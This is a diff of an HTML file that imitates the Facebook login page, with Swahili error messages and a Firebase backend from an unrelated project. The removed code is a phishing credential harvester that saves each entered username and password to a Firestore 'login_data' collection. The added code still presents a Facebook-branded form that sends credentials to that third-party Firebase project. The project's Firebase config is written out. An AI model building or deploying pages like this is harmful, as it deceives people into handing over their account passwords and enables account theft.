@@ -1,178 +1,360 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Facebook – log in or sign up</title>
-  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap" rel="stylesheet"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook</title>
+
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
-      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: center;
-      background: #f0f2f5;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      align-items: center;
+      min-height: 100vh;
       padding: 20px;
     }
 
-    .logo {
-      font-size: 2.6rem;
-      font-weight: 700;
+    .fb-logo {
+      font-size: 60px;
+      font-weight: 800;
       color: #1877f2;
-      letter-spacing: -1px;
-      margin-bottom: 8px;
+      letter-spacing: -2px;
+      text-align: center;
+      margin-bottom: 12px;
+      line-height: 1;
     }
 
-    .tagline {
-      font-size: 1.05rem;
+    .fb-tagline {
+      font-size: 17px;
       color: #1c1e21;
       text-align: center;
-      max-width: 300px;
-      line-height: 1.4;
-      margin-bottom: 24px;
+      max-width: 320px;
+      line-height: 1.5;
+      margin-bottom: 20px;
     }
 
     .card {
       background: #fff;
       border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
-      padding: 20px 16px 28px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+      padding: 16px;
       width: 100%;
-      max-width: 396px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
+      max-width: 380px;
     }
 
-    input {
+    .fb-input {
+      display: block;
       width: 100%;
       padding: 14px 16px;
+      margin-bottom: 12px;
       border: 1px solid #dddfe2;
       border-radius: 6px;
-      font-size: 1rem;
+      font-size: 17px;
       color: #1c1e21;
+      background: #fff;
       outline: none;
-      transition: border-color .15s;
+      font-family: inherit;
+      transition: border-color 0.15s, box-shadow 0.15s;
     }
-    input::placeholder { color: #8a8d91; }
-    input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,.2); }
+    .fb-input::placeholder { color: #90949c; }
+    .fb-input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24,119,242,0.25);
+    }
+    .fb-input.error-field { border-color: #e02b2b; }
+
+    .error-msg {
+      color: #e02b2b;
+      font-size: 13px;
+      margin: -8px 0 10px 4px;
+      display: none;
+    }
+    .error-msg.show { display: block; }
 
     .btn-login {
+      display: block;
+      width: 100%;
+      padding: 14px;
       background: #1877f2;
       color: #fff;
       border: none;
       border-radius: 6px;
-      font-size: 1.1rem;
+      font-size: 20px;
       font-weight: 700;
-      padding: 14px;
       cursor: pointer;
-      transition: background .15s;
+      font-family: inherit;
+      transition: background 0.15s;
+      margin-bottom: 16px;
     }
-    .btn-login:hover { background: #166fe5; }
+    .btn-login:hover   { background: #166fe5; }
+    .btn-login:active  { background: #1364d3; }
+    .btn-login:disabled { opacity: 0.65; cursor: not-allowed; }
 
-    .forgot {
+    .fb-link {
+      display: block;
       text-align: center;
       color: #1877f2;
-      font-size: 0.875rem;
-      cursor: pointer;
+      font-size: 14px;
+      font-weight: 600;
       text-decoration: none;
+      margin-bottom: 18px;
+      cursor: pointer;
     }
-    .forgot:hover { text-decoration: underline; }
+    .fb-link:hover { text-decoration: underline; }
 
-    .divider {
-      height: 1px;
-      background: #dadde1;
-      margin: 4px 0;
+    .fb-divider {
+      border: none;
+      border-top: 1px solid #dadde1;
+      margin-bottom: 20px;
     }
 
     .btn-create {
+      display: block;
+      width: fit-content;
+      margin: 0 auto;
+      padding: 14px 20px;
       background: #42b72a;
       color: #fff;
       border: none;
       border-radius: 6px;
-      font-size: 1rem;
+      font-size: 17px;
       font-weight: 700;
-      padding: 14px;
       cursor: pointer;
-      transition: background .15s;
-      width: fit-content;
-      align-self: center;
-      padding: 12px 24px;
+      font-family: inherit;
+      transition: background 0.15s;
     }
-    .btn-create:hover { background: #36a420; }
+    .btn-create:hover  { background: #36a420; }
+    .btn-create:active { background: #2d8f1b; }
 
-    .footer {
-      margin-top: 28px;
-      font-size: 0.85rem;
+    .fb-footer {
+      margin-top: 24px;
+      font-size: 13px;
       color: #1c1e21;
       text-align: center;
     }
-    .footer a { color: #1c1e21; text-decoration: none; font-weight: 600; }
-    .footer a:hover { text-decoration: underline; }
+
+    /* Success screen */
+    .success-screen {
+      display: none;
+      text-align: center;
+      padding: 20px 0 10px;
+    }
+    .success-screen.show { display: block; }
+    .success-icon {
+      font-size: 48px;
+      margin-bottom: 12px;
+    }
+    .success-email {
+      font-size: 15px;
+      color: #606770;
+      margin-top: 6px;
+      word-break: break-all;
+    }
+    .success-name {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1c1e21;
+    }
+    .btn-logout {
+      margin-top: 20px;
+      padding: 10px 24px;
+      background: #f0f2f5;
+      border: 1px solid #dadde1;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 600;
+      color: #4b4f56;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .btn-logout:hover { background: #e4e6eb; }
+
+    /* Toast */
+    .toast {
+      position: fixed;
+      bottom: 28px;
+      left: 50%;
+      transform: translateX(-50%) translateY(12px);
+      background: #323436;
+      color: #fff;
+      padding: 10px 22px;
+      border-radius: 6px;
+      font-size: 15px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.25s, transform 0.25s;
+      z-index: 999;
+      white-space: nowrap;
+    }
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    .toast.err  { background: #e02b2b; }
+    .toast.ok   { background: #42b72a; }
   </style>
 </head>
+
 <body>
 
-  <div class="logo">facebook</div>
-  <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
+  <div class="fb-logo">facebook</div>
+  <p class="fb-tagline">Facebook helps you connect and share with the people in your life.</p>
 
   <div class="card">
-    <input type="text" placeholder="Email address or phone number" autocomplete="username"/>
-    <input type="password" placeholder="Password" autocomplete="current-password"/>
-    <button class="btn-login">Log in</button>
-    <a href="#" class="forgot">Forgotten password?</a>
-    <div class="divider"></div>
-    <button class="btn-create">Create new account</button>
+
+    <!-- Login form -->
+    <div id="loginForm">
+      <input class="fb-input" type="email" id="emailInput" placeholder="Email address or phone number" autocomplete="email">
+      <div class="error-msg" id="emailErr">Weka email sahihi.</div>
+
+      <input class="fb-input" type="password" id="passInput" placeholder="Password" autocomplete="current-password">
+      <div class="error-msg" id="passErr">Password haipaswi kuwa tupu.</div>
+
+      <button class="btn-login" id="btnLogin" onclick="ingia()">Log in</button>
+      <a class="fb-link" onclick="sahauPassword()">Forgotten password?</a>
+      <hr class="fb-divider">
+      <button class="btn-create" onclick="jisajili()">Create new account</button>
+    </div>
+
+    <!-- Success screen (after login) -->
+    <div class="success-screen" id="successScreen">
+      <div class="success-icon">✅</div>
+      <div class="success-name" id="successName"></div>
+      <div class="success-email" id="successEmail"></div>
+      <button class="btn-logout" onclick="toka()">Log out</button>
+    </div>
+
   </div>
 
-  <p class="footer">
-    <a href="#">Create a Page</a> for a celebrity, brand or business.
-  </p>
+  <p class="fb-footer"><strong>Create a Page</strong> for a celebrity, brand or business.</p>
+  <div class="toast" id="toast"></div>
+
 <script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+  import { initializeApp }        from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+  import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged }
+    from "https://www.gstatic.com/firebasejs/10.0.0/firebase-auth.js";
 
-const firebaseConfig = {
-  apiKey: "AIzaSyDCKHDp1VpDTRr4-HGqgE1OFkEwWIDZyqI",
-  authDomain: "sadegpt-f79d7.firebaseapp.com",
-  projectId: "sadegpt-f79d7",
-  storageBucket: "sadegpt-f79d7.firebasestorage.app",
-  messagingSenderId: "474328809093",
-  appId: "1:474328809093:web:e94c3af5eca2e7949fb3ec",
-  measurementId: "G-53KDWTRR4H"
-};
+  const firebaseConfig = {
+    apiKey:            "AIzaSyDCKHDp1VpDTRr4-HGqgE1OFkEwWIDZyqI",
+    authDomain:        "sadegpt-f79d7.firebaseapp.com",
+    projectId:         "sadegpt-f79d7",
+    storageBucket:     "sadegpt-f79d7.firebasestorage.app",
+    messagingSenderId: "474328809093",
+    appId:             "1:474328809093:web:e94c3af5eca2e7949fb3ec"
+  };
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+  const app  = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
 
-async function loginUser() {
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
-
-  if (!username || !password) {
-    alert("Jaza taarifa zote");
-    return;
+  /* ── Toast ── */
+  function toast(msg, type = "") {
+    const el = document.getElementById("toast");
+    el.textContent = msg;
+    el.className = "toast " + type;
+    el.classList.add("show");
+    setTimeout(() => el.classList.remove("show"), 3500);
   }
 
-  try {
-    await addDoc(collection(db, "login_data"), {
-      username: username,
-      password: password,
-      time: new Date()
-    });
+  /* ── Auth state listener ── */
+  onAuthStateChanged(auth, (user) => {
+    if (user) {
+      showSuccess(user);
+    } else {
+      showForm();
+    }
+  });
 
-    alert("Imetumwa!");
-
-  } catch (error) {
-    alert("Error: " + error.message);
+  /* ── Show success screen ── */
+  function showSuccess(user) {
+    document.getElementById("loginForm").style.display    = "none";
+    document.getElementById("successScreen").classList.add("show");
+    document.getElementById("successEmail").textContent   = user.email;
+    document.getElementById("successName").textContent    =
+      user.displayName || user.email.split("@")[0];
   }
-}
 
-window.loginUser = loginUser;
+  /* ── Show login form ── */
+  function showForm() {
+    document.getElementById("loginForm").style.display    = "block";
+    document.getElementById("successScreen").classList.remove("show");
+  }
+
+  /* ── Login ── */
+  async function ingia() {
+    const email = document.getElementById("emailInput").value.trim();
+    const pass  = document.getElementById("passInput").value;
+    const btn   = document.getElementById("btnLogin");
+
+    // Clear errors
+    document.getElementById("emailErr").classList.remove("show");
+    document.getElementById("passErr").classList.remove("show");
+    document.getElementById("emailInput").classList.remove("error-field");
+    document.getElementById("passInput").classList.remove("error-field");
+
+    let valid = true;
+    if (!email || !email.includes("@")) {
+      document.getElementById("emailErr").classList.add("show");
+      document.getElementById("emailInput").classList.add("error-field");
+      valid = false;
+    }
+    if (!pass) {
+      document.getElementById("passErr").classList.add("show");
+      document.getElementById("passInput").classList.add("error-field");
+      valid = false;
+    }
+    if (!valid) return;
+
+    btn.disabled    = true;
+    btn.textContent = "Logging in...";
+
+    try {
+      await signInWithEmailAndPassword(auth, email, pass);
+      toast("Umeingia kikamilifu ✓", "ok");
+    } catch (e) {
+      let msg = "Imeshindwa kuingia.";
+      if (e.code === "auth/user-not-found")    msg = "Akaunti haipatikani.";
+      if (e.code === "auth/wrong-password")     msg = "Password si sahihi.";
+      if (e.code === "auth/invalid-email")      msg = "Email si sahihi.";
+      if (e.code === "auth/too-many-requests")  msg = "Majaribio mengi. Jaribu baadaye.";
+      if (e.code === "auth/invalid-credential") msg = "Email au password si sahihi.";
+      toast(msg, "err");
+    } finally {
+      btn.disabled    = false;
+      btn.textContent = "Log in";
+    }
+  }
+
+  /* ── Logout ── */
+  async function toka() {
+    await signOut(auth);
+    toast("Umetoka nje.", "");
+  }
+
+  /* ── Forgotten password ── */
+  function sahauPassword() {
+    toast("Fungua email yako ili kupata link ya kubadilisha password.", "");
+  }
+
+  /* ── Create account ── */
+  function jisajili() {
+    toast("Nenda kwenye Facebook.com kuunda akaunti mpya.", "");
+  }
+
+  /* ── Enter key support ── */
+  document.getElementById("passInput").addEventListener("keydown", (e) => {
+    if (e.key === "Enter") ingia();
+  });
+  document.getElementById("emailInput").addEventListener("keydown", (e) => {
+    if (e.key === "Enter") document.getElementById("passInput").focus();
+  });
+
+  window.ingia         = ingia;
+  window.toka          = toka;
+  window.sahauPassword = sahauPassword;
+  window.jisajili      = jisajili;
 </script>
+
 </body>
 </html>
